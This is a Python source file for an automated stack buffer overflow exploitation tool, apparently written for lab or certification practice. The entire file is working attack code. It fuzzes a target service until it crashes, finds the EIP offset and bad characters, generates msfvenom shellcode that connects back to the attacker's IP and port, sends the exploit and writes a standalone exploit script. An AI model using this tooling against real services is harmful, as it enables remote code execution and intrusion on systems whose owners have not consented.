#!/usr/bin/python
import time
import socket
import subprocess
from pwn import asm
import binascii

# Error codes
BOFErrorSuccess = 0
BOFErrorFailure = -1
BOFErrorConnectionRefused = -2
BOFErrorConnectionTimeout = -3
BOFErrorServiceAlive = -4
BOFErrorServicePaused = -5
BOFErrorValueNotFound = -6
BOFErrorNoSpace = -7
BOFErrorInvalid = -8

# Live prefix/suffix options
BOFLiveOptions = ["payload_len"]


def live_option_long(option: str) -> bytes:
    return ("BOFLive." + option).encode()


def execute(cmd: str) -> bytes:
    return subprocess.run(cmd, shell=True, capture_output=True).stdout


class BOFHelper:  # FIX: Error checking inputs, binascii.unhexlify, commands, live prefix/suffix
    def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
                 debug: bool = False):
        self._interface = interface
        self._lPort = local_port
        self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
            .decode()
        self._ip = ip
        self._port = port
        self._header = header
        self._origHeader = header
        self._liveOptions = {}
        self._prefix = prefix
        self._suffix = suffix
        self._inc = inc  # The step of increment in getNumBytesToOverflow().
        self._timeout = timeout  # The default value of 200 would be the efficient for most services.
        self._debug = debug

        for option in BOFLiveOptions:
            full_option = live_option_long(option)
            if full_option in self._header:
                self._liveOptions[full_option] = b""

        self._numBytesObtained = False
        self._eipOffset = 0
        self._eipObtained = False
        self._badChars = [chr(0)]
        self._badCharsFound = False
        self._shellCode = b""
        self._shellCodeGenerated = False
        self._canExpand = True
        self._stackSpace = 0
        self._firstStage = b""
        self._shellCodeInESP = True
        self._spaceExpanded = False
        self._eip = b""
        self._exploit = b""

    # Logs & Helpers

    def input(self, text: str, debug: bool = False) -> str:
        if (not debug) or (debug and self._debug):
            return input(str(text))

    def _log(self, text: str, debug: bool = False) -> None:
        if (not debug) or (debug and self._debug):
            print(str(text))

    def func_log(self, text: str, debug: bool = False) -> None:
        self._log("[-] " + text, debug)

    def success_log(self, text: str, debug: bool = False) -> None:
        self._log("[+] " + text, debug)

    def debug_log(self, text: str) -> None:
        self._log("(-) " + text, True)

    def step_log(self, text: str, debug: bool = False) -> None:
        self._log("(+) " + text, debug)

    def prompt_log(self, text: str, debug: bool = False) -> None:
        self._log("(*) " + text, debug)

    def warn_log(self, text: str, debug: bool = False) -> None:
        self._log("(!) " + text, debug)

    def err_log(self, text: str, debug: bool = False) -> None:
        self._log("(!!!) " + text, debug)

    def prompt_restart(self):
        self.prompt_log("Please restart the vulnerable application and your debugger. Type anything to continue...")
        input()

    def _process_header(self) -> None:
        for option in self._liveOptions:
            self._header = self._origHeader.replace(option, self._liveOptions[option])

    # @function send_data
    # @abstract Helper function sending data to designated port on the target.
    # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
    #               The payload would be sent with the predefined prefix and suffix, and if the
    #               request has timed out, it would be recursively resent (up to five times). To test
    #               if the service is open, simply pass an empty (i.e. "") @buffer as the argument.
    # @param buffer Bytes object storing the data to be sent.
    # @param trial  Records the number of time this request has been resent. Set to 5 to disable
    #               resending in case of socket timeout.

    def send_data(self, buffer: bytes, trial: int = 5) -> int:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((self._ip, self._port))
            if buffer:
                option = live_option_long("payload_len")
                if option in self._liveOptions:
                    self._liveOptions[option] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
                self._process_header()
                s.send(self._header + self._prefix + buffer + self._suffix)
        except ConnectionRefusedError:
            self.err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
            return BOFErrorConnectionRefused
        except socket.timeout:
            if trial < 5:
                return self.send_data(buffer, trial + 1)
            return BOFErrorConnectionTimeout
        try:
            res = s.recv(1024).decode()
            self.debug_log(res)
        except ConnectionResetError:
            return BOFErrorConnectionTimeout
        except socket.timeout:
            self.warn_log("Remember to start the service!")
            return BOFErrorServicePaused

        s.close()
        time.sleep(1)
        return BOFErrorSuccess

    # @function _get_byte_for_overflow
    # @abstract Private function for finding a rough number of bytes needed to overflow the service.
    # @discussion     This function recursively sends buffers, incrementing in size each iteration by
    #                 @self._inc, to the service and checks if it has crashed. If an overflow has been
    #                 triggered successfully, it would return @current for use in its caller get_eip_offset().
    # @param current  The number of bytes that is to be sent to the service in the current iteration.
    # @result         @current if succeeded; BOFErrorConnectionRefused if failed to connect.

    def _get_byte_for_overflow(self, current: int = 0) -> int:
        self.debug_log("Fuzzing with %s bytes" % current)

        # No need to test for timeout
        error = self.send_data(b"A" * current, 5)

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused:
            self.err_log("Connection refused! (current: %d)" % current)
            return BOFErrorConnectionRefused

        # Service crashed -> print and proceed
        elif error == BOFErrorConnectionTimeout:
            if current == 0:
                self.err_log("Service is not open!")
                return BOFErrorConnectionRefused

            self.success_log("Service crashed at %s bytes!" % current)
            self.prompt_restart()

            # high = @current (as it has successfully caused overflow)
            # low = previous @current (i.e. current - self._inc)
            return current

        # Service didn't crash -> increment @current by self._inc
        current += self._inc
        return self._get_byte_for_overflow(current)

    # @function _send_unique_pattern
    # @abstract Private function to send a unique pattern to the service with a given length.
    # @discussion   A unique pattern of @length is generated with the msf_pattern_create utility
    #               and sent to @self._port. If the service has crashed due to overflow, the user
    #               should provide the value at the EIP register which would be then used to
    #               identify the exact offset of EIP on the stack.
    # @param length The length of the pattern to be sent.
    # @result       @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect;
    #               BOFErrorServiceAlive if service did not crash; BOFErrorValueNotFound if value
    #               is not found in pattern.

    def _send_unique_pattern(self, length: int):
        error = self.send_data(execute("msf-pattern_create -l %s" % length), 5)

        # Service didn't crash. Bye!
        if error == BOFErrorSuccess:
            self.err_log("Service did not crash!")
            return BOFErrorServiceAlive

        # Wait for user to resume the service & resend
        elif error == BOFErrorServicePaused:
            return self._send_unique_pattern(length)

        # Connection refused. Bye!
        elif error == BOFErrorConnectionRefused:
            return BOFErrorConnectionRefused

        # Service crashed -> find EIP
        eip = self.input("Service crashed. Please enter the value in EIP: ").replace("\\x", "").replace("0x", "")
        self.step_log("Locating offset of EIP on the stack...")
        try:
            self._eipOffset = int(execute("msf-pattern_offset -q %s" % eip).decode().split()[-1])
        except IndexError:
            self.warn_log("Value not found in pattern!")
            self._eipOffset = BOFErrorValueNotFound
        else:
            self._eipObtained = True
            self._stackSpace = length - self._eipOffset - 4
            if self._stackSpace <= 0:
                self.err_log("WTF?! Stack space should be greater than 0. Never saw this coming...")
                return BOFErrorInvalid
            self.success_log("Exact match found at offset %s!" % self._eipOffset)
        self.prompt_restart()
        return self._eipOffset

    # @function get_eip_offset
    # @abstract Obtain the EIP offset for the specified service.
    # @discussion Utilizing a binary search approach, this function derives the EIP offset by recursively
    #             calling _send_unique_pattern() with @length as the average of @high and @low. If
    #             the service did not crash, @low would be increased. If the EIP is not obtained despite
    #             a successful overflow, @high should be decreased.
    #             Note that the service may need to be restarted repeatedly in order for the program
    #             to work.
    # @param high The current minimum number of bytes needed to overflow the service.
    # @param low  The current maximum number of bytes that would not overflow the service.
    # @result     @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect.

    def get_eip_offset(self, high: int = 0, low: int = 0) -> int:
        if self._eipObtained:
            return self._eipOffset

        if self._numBytesObtained is False:
            self.func_log("Fuzzing service...")
            high = self._get_byte_for_overflow()
            low = high - self._inc
            if high == BOFErrorConnectionRefused:
                return BOFErrorConnectionRefused
            self._numBytesObtained = True
            self.func_log("Locating EIP...")

        mid = low + (high - low) // 2  # Safe way to get mid
        print(mid)
        error = self._send_unique_pattern(mid)

        # Success!
        if error > 0:
            return error

        # Connection refused. Bye!
        elif error == BOFErrorConnectionRefused:
            return BOFErrorConnectionRefused

        # Did not crash -> set @low to mid
        elif error == BOFErrorServiceAlive:
            return self.get_eip_offset(high, mid)

        # EIP not obtained -> set @high to mid
        elif error == BOFErrorValueNotFound:
            self._canExpand = False
            return self.get_eip_offset(mid, low)

        # Impossible case. Should never get here
        return BOFErrorInvalid

    # TO-DO: user simply dump stack that a function can process

    # @function _send_chars
    # @abstract Private function sending specified characters to service.
    # @discussion  This recursive function continuously send a list of strings to the service until all
    #              bad characters in it have been found. In each iteration, the user has to manually
    #              find the bad characters and update it through input, which would be then added to
    #              @self._badChars and removed from the @chars list.
    # @param chars The list of characters to be sent to the service.
    # @result      The update @chars if succeeded; [] if failed.

    def _send_chars(self, chars: list[str]) -> list[str]:
        # Buffer: chars + filler + eip + filler
        error = self.send_data(''.join(chars).encode() + b"A" * (self._eipOffset - len(chars))
                               + b"B" * 4 + b"C" * self._stackSpace, 5)

        # Service should always crash
        if error == BOFErrorSuccess:
            self.err_log("WTF?! Service did not crash! This should never happen!")
            return []

        # Connection refused. Bye!
        if error == BOFErrorConnectionRefused:
            return []

        if error == BOFErrorConnectionTimeout:
            self.prompt_restart()
            self.success_log("Characters sent!")
            self.prompt_log("Current bad characters: ".join(self._badChars))
            ans = self.input("Enter new bad characters found (separate with space): ").strip()
            if ans == "":
                self.success_log("Empty input, assuming that all bad characters have been found!")
                return chars
            elif " " in ans:
                for char in ans.split(" "):
                    self._badChars.extend(char)
                    chars.remove(char)
            else:
                self._badChars.extend(ans)
                chars.remove(ans)

            self.debug_log("Sending updated character list...")
            return self._send_chars(chars)

        # Impossible case. Should never get here
        return []

    # @function find_bad_chars
    # @abstract Find bad characters in the service.
    # @discussion This function attempts to discover all bad characters presented in the service. It
    #             places a generated list of all characters in front of EIP, sends it to the service
    #             with _send_chars(), and sets @self._badCharsFound. If there is not enough space in
    #             the filler for all characters, this function would automatically split it into several
    #             roughly equal-sized segments and dispatch one at a time.
    #             Note that function get_eip_offset() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if failed; BOFErrorInvalid if function
    #             get_eip_offset() is not yet invoked.

    def find_bad_chars(self) -> int:
        self.func_log("Finding bad characters...")

        if not self._eipObtained:
            self.err_log("Please first locate the EIP offset!")
            return BOFErrorInvalid

        if not self._badCharsFound:
            all_chars = []
            for i in range(1, 256):
                all_chars.append(str(chr(i)))

            if self._eipOffset >= len(all_chars):
                size = len(all_chars)
            else:
                size = self._eipOffset

            for i in range(0, len(all_chars), size):
                chars = self._send_chars(all_chars[i:i + size])
                if not chars:
                    return BOFErrorFailure

        self.success_log("All bad characters found: ".join(self._badChars))
        self._badCharsFound = True
        return BOFErrorSuccess

    # @function generate_shellcode
    # @abstract Generate the shellcode for use in exploitation.
    # @discussion This function generates the shellcode with the command line package msfvenom. It
    #             first asks for the user to specify a payload to use - if it does not exist, a list
    #             of all available payloads would be printed. After successfully parsing the name,
    #             this function executes a msfvenom command to generate the payload, automatically
    #             completing the parameters with previously obtained values. The shellcode is stored
    #             in @self._shellCode.
    #             Note that function find_bad_chars() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorInvalid if function find_bad_chars() is not
    #             yet invoked.

    def generate_shellcode(self) -> int:
        self.func_log("Generating shellcode...")

        if not self._badCharsFound:
            self.err_log("Please first find the bad characters!")
            return BOFErrorInvalid

        # Add NOP slides
        self._shellCode += b"\x90" * 16
        all_payloads = execute("msfvenom --list payload").decode()
        while True:
            ans = self.input("Please enter the name of the payload to employ: ").strip().lower()
            if ans in all_payloads:
                break
            self.warn_log("Payload name does not exist. Printing help page...")
            print(all_payloads)

        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread -b\"%s\""
                                   "-f raw" % (ans, self._lIP, self._lPort, "".join(self._badChars)))
        self._shellCodeGenerated = True
        return BOFErrorSuccess

    # @function _find_space
    # @abstract Private function to locate space before EIP for the payload.
    # @discussion This function checks if the space before EIP could be used to store the payload
    #             should ESP prove to be unavailable. If the space before EIP is larger than the
    #             size of @self._shellcode, it would proceed to insert a first stage shellcode in
    #             the ESP so that the program could jump to the shellcode. The user needs to provide
    #             the register that the filler appears to be in. If there is no space in ESP even
    #             for the first stage shellcode, the function would ask for an address with an
    #             instruction that directly jumps to the designated register if possible.
    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
    #             payload.

    def _find_space(self) -> int:
        if not self._shellCodeGenerated:
            self.err_log("Please first generate the shellcode!")
            return BOFErrorInvalid

        if self._eipOffset < (len(self._shellCode)):
            self.err_log("There is not enough space before EIP to insert the payload!")
            return BOFErrorNoSpace

        # Generate first stage shellcode
        register = self.input("Please enter the register that records your payload: ").strip()
        self._firstStage = str(asm("add %s, %d; jmp %s" % (register, len(self._prefix), register)))
        if len(self._firstStage) > self._stackSpace:
            self.err_log("There is not enough space in ESP for the first stage shellcode!")
            self._eip = binascii.unhexlify(self.input("Please input an address containing the instruction <jmp %s>:"
                                                      % register).strip().replace("\\x", "").replace("0x", ""))
            if not self._eip:  # Certainly won't work
                return BOFErrorNoSpace
            # Fall through

        # We have the entire filler space at our disposal
        self._shellCodeInESP = False
        self._spaceExpanded = True
        self._stackSpace = self._eipOffset
        self.success_log("The filler space (%s) is all yours :)" % self._eipOffset)
        return BOFErrorSuccess

    # @function expand_space
    # @abstract Attempt to expand the available space to store the shellcode.
    # @discussion In order for the shellcode to be injected, there must be sufficient space to store
    #             it. If there were not an attempt to shrink the buffer in get_eip_offset(), this
    #             function should be executed to gather more space in the stack. If the available
    #             space already exceeds the shellcode length, there is no need to run this function.
    #             After sending a payload of len(@self._shellcode), this function asks user verification
    #             to check if the space is available. If not, it would proceed to _find_space() to
    #             look for space before EIP.
    #             Note that function generate_shellcode() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorServiceAlive if service did not crash; BOFError-
    #             ConnectionRefused if connection refused.

    def expand_space(self) -> int:
        self.func_log("Expanding space...")

        if self._canExpand:
            space = len(self._shellCode)
            if not self._shellCodeGenerated:
                self.err_log("Please first generate the shellcode!")
                return BOFErrorInvalid
            if self._stackSpace >= space:
                self._spaceExpanded = True
                return BOFErrorSuccess

            # Buffer: filler (len = self._eipOffset) + eip (len = 4) + new space (len = space)
            error = self.send_data(b"A" * self._eipOffset + b"B" * 4 + b"C" * space, 5)

            # Service should always crash
            if error == BOFErrorSuccess:
                self.err_log("Service did not crash! (should never happen)")
                return BOFErrorServiceAlive

            # Connection refused. Bye!
            elif error == BOFErrorConnectionRefused:
                return BOFErrorConnectionRefused

            # User validation required
            self.prompt_restart()
            ans = self.input("Payload sent. Check to see if ESP is filled with %s D's. (y/n)" % space).lower()

            # Success! Update stack space.
            if ans == 'y':
                self.success_log("Successfully expanded space to the payload length (%s with NOPs)!" % space)
                self._spaceExpanded = True
                self._stackSpace = space
                return BOFErrorSuccess

            # Fall through

        self.step_log("Unable to perform expansion. Proceeding to find space...")
        return self._find_space()

    # @function build_exploit
    # @abstract Build the exploit after other functions are executed.
    # @result BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked.

    def build_exploit(self) -> int:
        self.func_log("Building exploit...")

        if not self._spaceExpanded:
            self.err_log("Please first expand space for shellcode!")
            return BOFErrorInvalid

        if self._eip:
            self._exploit = self._shellCode + b"A" * (self._eipOffset - len(self._shellCode)) + self._eip
        else:
            self._eip = binascii.unhexlify(self.input("Enter address to overwrite EIP with: ").strip()
                                           .replace("\\x", "").replace("0x", ""))
            # TO-DO: catch exceptions
            if self._shellCodeInESP:
                self._exploit = b"A" * self._eipOffset + self._eip + self._shellCode
            else:
                self._exploit = self._shellCode + b"A" * (self._eipOffset - len(self._shellCode)) + self._eip \
                                + self._firstStage

        self.success_log("Exploit built successfully!", True)
        return BOFErrorSuccess

    # @function send_exploit
    # @abstract Dispatch the exploit.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def send_exploit(self) -> int:
        self.func_log("Exploiting...")

        if self._exploit == b"":
            if self.build_exploit():
                return BOFErrorFailure

        if self.send_data(self._exploit, 5) != BOFErrorConnectionTimeout:
            self.err_log("Exploit failed. Try sending the payload manually.")
            return BOFErrorFailure

        self.success_log("Exploitation completed!!!")
        return BOFErrorSuccess

    # @function generate_file
    # @abstract Generate exploit.py that could be used for manual exploitation.
    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.

    def generate_file(self) -> int:
        self.func_log("Generating exploit.py...")

        if self._exploit == b"":
            if self.build_exploit():
                return BOFErrorFailure

        output = "#!/usr/bin/python\n" \
                 "import socket\n" \
                 "buf = %s\n" \
                 "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" \
                 "s.connect((\"%s\", %s))\n" \
                 "data = s.recv(1024)\n" \
                 "print data\n" \
                 "s.send(exploit)\n" \
                 "s.close()" % (self._exploit.decode(), self._ip, self._port)

        with open("/tmp/exploit.py", "w") as file:
            file.write(output)
            file.close()
            self.success_log("Successfully generated /tmp/exploit.py!")
            return BOFErrorSuccess

    # @function perform_bof
    # @abstract Perform a full BoF with member functions.
    # @result True if succeeded; False if failed.

    def perform_bof(self) -> bool:
        if self.get_eip_offset() < 0:
            return False
        if self.find_bad_chars():
            return False
        if self.generate_shellcode():
            return False
        if self.expand_space():
            return False
        if self.send_exploit():
            return False
        if self.generate_file():
            return False
        return True
